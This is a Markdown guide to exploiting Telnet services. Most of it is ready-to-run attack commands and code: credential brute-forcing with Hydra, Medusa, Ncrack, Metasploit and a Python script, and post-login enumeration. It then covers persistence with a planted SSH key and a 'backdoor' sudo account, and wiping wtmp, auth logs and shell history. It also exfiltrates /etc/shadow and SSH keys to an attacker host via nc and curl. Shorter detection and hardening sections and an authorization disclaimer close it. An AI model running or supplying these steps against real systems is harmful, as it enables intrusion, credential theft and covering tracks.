# 🔐 Telnet (Port 23) - Exploitation Guide

## 🎯 Vulnerability Overview

**Service:** Telnet (Telecommunication Network)  
**Port:** 23/tcp  
**Protocol:** Clear Text  
**Vulnerability Type:** Weak Authentication, Information Disclosure  
**Severity:** High

### Description
Telnet is an inherently insecure protocol that transmits all data, including credentials, in plaintext. Common vulnerabilities include weak default credentials, brute force attacks, and information disclosure through banner grabbing.

---

## 🔍 Reconnaissance Workflow

### Step 1: Service Detection

#### Port Scanning
```bash
# Quick port check
nmap -p 23 <target-ip>

# Service version detection
nmap -sV -p 23 <target-ip>

# Comprehensive telnet enumeration
nmap -sV -sC -p 23 --script telnet-* <target-ip>
```

#### Banner Grabbing
```bash
# Direct telnet connection
telnet <target-ip> 23

# Using netcat
nc <target-ip> 23

# Using nmap script
nmap --script banner -p 23 <target-ip>
```

**Common Banners:**
```
Ubuntu 20.04.1 LTS
login:

Red Hat Enterprise Linux Server 7.9
login:

Welcome to OpenWrt
login:
```

### Step 2: Information Gathering

#### System Information Extraction
```bash
# Connect and gather pre-auth information
telnet <target-ip>
# Note the login banner for OS identification
# Press Ctrl+] then 'quit' to exit without attempting login
```

#### Service Fingerprinting
```bash
# Extended banner grabbing
echo "" | nc -w 5 <target-ip> 23

# Using curl for banner
curl -m 10 telnet://<target-ip>:23
```

---

## 💥 Exploitation Workflow

### Method 1: Default Credential Testing

#### Common Default Credentials
```bash
# Test common username/password combinations
telnet <target-ip>

# Common combinations to try:
# admin:admin
# admin:password
# admin:123456
# root:root
# root:toor
# root:password
# user:user
# guest:guest
# admin:(blank)
# root:(blank)
```

#### Automated Default Credential Testing
```bash
# Create credential list
cat > creds.txt << EOF
admin:admin
admin:password
admin:123456
root:root
root:toor
root:password
user:user
guest:guest
administrator:administrator
EOF

# Manual testing script
#!/bin/bash
while IFS=: read -r username password; do
    echo "Testing $username:$password"
    (echo "$username"; sleep 1; echo "$password"; sleep 2) | telnet <target-ip> 23
    sleep 3
done < creds.txt
```

### Method 2: Brute Force Attack

#### Using Hydra
```bash
# Single username brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt <target-ip> telnet

# Multiple usernames
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <target-ip> telnet

# Specific credential lists
hydra -L userlist.txt -P passlist.txt <target-ip> telnet -t 4 -V

# With timing controls
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> telnet -t 1 -w 3
```

#### Using Medusa
```bash
# Basic brute force
medusa -h <target-ip> -u root -P /usr/share/wordlists/rockyou.txt -M telnet

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M telnet -t 5

# Verbose output
medusa -h <target-ip> -U users.txt -P passwords.txt -M telnet -v 6
```

#### Using Ncrack
```bash
# Basic usage
ncrack -p 23 --user root -P /usr/share/wordlists/rockyou.txt <target-ip>

# Multiple services
ncrack -p telnet --user admin -P passwords.txt <target-ip>

# Timing controls
ncrack -p 23 --user root -P passwords.txt -T 3 <target-ip>
```

### Method 3: Metasploit Exploitation

#### Telnet Login Scanner
```bash
# Start Metasploit
msfconsole

# Use telnet login auxiliary
use auxiliary/scanner/telnet/telnet_login

# Set options
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt

# Advanced options
set THREADS 5
set VERBOSE true
set STOP_ON_SUCCESS true

# Execute scan
run
```

#### Version Detection
```bash
# Use telnet version scanner
use auxiliary/scanner/telnet/telnet_version
set RHOSTS <target-ip>
run
```

### Method 4: Custom Exploitation Scripts

#### Python Brute Force Script
```python
#!/usr/bin/env python3
import socket
import sys
import time
from itertools import product

def telnet_login(target, port, username, password):
    try:
        # Connect to telnet
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target, port))
        
        # Read banner
        banner = sock.recv(1024).decode()
        
        # Send username
        sock.send(f"{username}\n".encode())
        time.sleep(1)
        
        # Read password prompt
        response = sock.recv(1024).decode()
        
        # Send password
        sock.send(f"{password}\n".encode())
        time.sleep(2)
        
        # Check for successful login
        result = sock.recv(1024).decode()
        sock.close()
        
        # Look for success indicators
        if any(indicator in result.lower() for indicator in ['$', '#', '~$', 'welcome']):
            return True
        else:
            return False
            
    except Exception as e:
        return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 telnet_brute.py <target-ip>")
        sys.exit(1)
    
    target = sys.argv[1]
    port = 23
    
    # Common credentials
    usernames = ['root', 'admin', 'administrator', 'user', 'guest']
    passwords = ['', 'root', 'admin', 'password', '123456', 'toor', 'pass']
    
    print(f"Starting brute force against {target}:{port}")
    
    for username, password in product(usernames, passwords):
        print(f"Trying {username}:{password}", end=' ... ')
        
        if telnet_login(target, port, username, password):
            print("SUCCESS!")
            print(f"Valid credentials: {username}:{password}")
            break
        else:
            print("Failed")
        
        time.sleep(1)  # Avoid overwhelming the service

if __name__ == "__main__":
    main()
```

---

## ✅ Post-Exploitation Activities

### Initial System Assessment
```bash
# After successful login, gather system information
whoami
id
uname -a
hostname
pwd

# Check current privileges
groups
sudo -l

# Environment variables
env
echo $PATH
echo $HOME
```

### System Enumeration
```bash
# Operating system details
cat /etc/*release*
cat /etc/issue
cat /proc/version

# Network configuration
ifconfig -a
ip addr show
route -n
netstat -tulpn
ss -tulpn

# Users and groups
cat /etc/passwd
cat /etc/group
w
who
last
```

### Service and Process Analysis
```bash
# Running processes
ps aux
ps -ef
top

# Services
systemctl list-units --type=service --state=running  # systemd
service --status-all                                  # SysV init
chkconfig --list                                      # RedHat/CentOS

# Network services
netstat -tlnp
lsof -i
```

### File System Analysis
```bash
# Home directories
ls -la /home/
ls -la /root/

# Configuration files
find /etc -name "*.conf" 2>/dev/null | head -20
ls -la /etc/ssh/
ls -la /etc/

# Log files
ls -la /var/log/
tail -20 /var/log/auth.log
tail -20 /var/log/secure

# Interesting files
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
find / -name "*password*" -o -name "*passwd*" 2>/dev/null
```

### Privilege Escalation Reconnaissance
```bash
# SUID/SGID binaries
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null

# World-writable files
find / -type f -perm -002 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*
```

---

## 🛠️ Advanced Techniques

### Session Persistence
```bash
# Add SSH key for persistent access
mkdir -p ~/.ssh
echo "<your-public-key>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Create backdoor user (if root access)
useradd -m -s /bin/bash backdoor
echo "backdoor:SecurePass123" | chpasswd
usermod -aG sudo backdoor  # Ubuntu/Debian
usermod -aG wheel backdoor # RedHat/CentOS
```

### Log Manipulation
```bash
# Clear telnet login logs (if possible)
> /var/log/wtmp
> /var/log/btmp
> /var/log/lastlog

# Clear specific entries
sed -i '/your-ip/d' /var/log/auth.log
sed -i '/telnet/d' /var/log/secure

# Clear history
history -c
> ~/.bash_history
```

### Data Exfiltration
```bash
# Compress sensitive data
tar -czf /tmp/sensitive.tar.gz /etc/passwd /etc/shadow /home/*/.ssh/

# Transfer via netcat
nc <your-ip> <your-port> < /tmp/sensitive.tar.gz

# Base64 encode for copy/paste
base64 -w 0 sensitive_file.txt

# Using built-in tools
curl -X POST -d @sensitive_file.txt http://<your-ip>:<your-port>/upload
```

---

## 🔍 Detection and Forensics

### Log Analysis
```bash
# Check telnet connections
grep "telnet" /var/log/auth.log
grep "login" /var/log/secure
grep "session opened" /var/log/auth.log

# Failed login attempts
grep "Failed password" /var/log/auth.log
grep "authentication failure" /var/log/secure

# Connection tracking
netstat -an | grep :23
lsof -i :23
```

### Network Monitoring
```bash
# Monitor telnet traffic (if access to network)
tcpdump -i any port 23 -A

# Wireshark filters
# tcp.port == 23
# telnet
```

### Incident Response
```bash
# Kill telnet sessions
pkill -f telnet
fuser -k 23/tcp

# Disable telnet service
systemctl stop telnetd
systemctl disable telnetd
chkconfig telnetd off

# Block telnet port
iptables -A INPUT -p tcp --dport 23 -j DROP
```

---

## 🛡️ Security Hardening

### Disable Telnet
```bash
# Ubuntu/Debian
sudo systemctl stop telnetd
sudo systemctl disable telnetd
sudo apt remove telnetd

# RedHat/CentOS
sudo systemctl stop telnet.socket
sudo systemctl disable telnet.socket
sudo yum remove telnet-server

# xinetd-based
sudo sed -i 's/disable = no/disable = yes/' /etc/xinetd.d/telnet
sudo systemctl restart xinetd
```

### Implement SSH Instead
```bash
# Install SSH server
sudo apt install openssh-server  # Ubuntu/Debian
sudo yum install openssh-server  # RedHat/CentOS

# Configure SSH securely
sudo nano /etc/ssh/sshd_config
# Set:
# PasswordAuthentication no
# PermitRootLogin no
# Protocol 2
# Port 2222 (non-standard port)

sudo systemctl restart sshd
```

### Firewall Configuration
```bash
# UFW (Ubuntu)
sudo ufw deny 23
sudo ufw allow ssh

# iptables
sudo iptables -A INPUT -p tcp --dport 23 -j DROP
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# firewalld (CentOS/RHEL)
sudo firewall-cmd --permanent --remove-service=telnet
sudo firewall-cmd --permanent --add-service=ssh
sudo firewall-cmd --reload
```

---

## 📚 References and Tools

### Essential Tools
- **Hydra:** THC password cracking tool
- **Medusa:** Parallel brute force tool
- **Ncrack:** Network authentication cracking tool
- **Metasploit:** Penetration testing framework
- **Telnet client:** Built-in telnet command

### Wordlists
```bash
# Common wordlists
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/others/names.txt
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

### Online Resources
- **CVE Database:** https://cve.mitre.org/
- **NIST Guidelines:** https://csrc.nist.gov/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **SecLists:** https://github.com/danielmiessler/SecLists

---

## ⚠️ Legal and Ethical Considerations

**WARNING:** This guide is for educational and authorized security testing purposes only.

### Important Guidelines:
- Always obtain proper written authorization before testing
- Only test systems you own or have explicit permission to test
- Follow responsible disclosure practices
- Document all activities for reporting purposes
- Comply with local laws and regulations
- Use findings to improve security, not cause harm

### Best Practices:
- Limit brute force attempts to avoid DoS
- Use timing delays between attempts
- Monitor system resources during testing
- Clean up any files or changes made during testing
- Report vulnerabilities through proper channels

---

*Last Updated: August 2025*  
*Version: 1.0*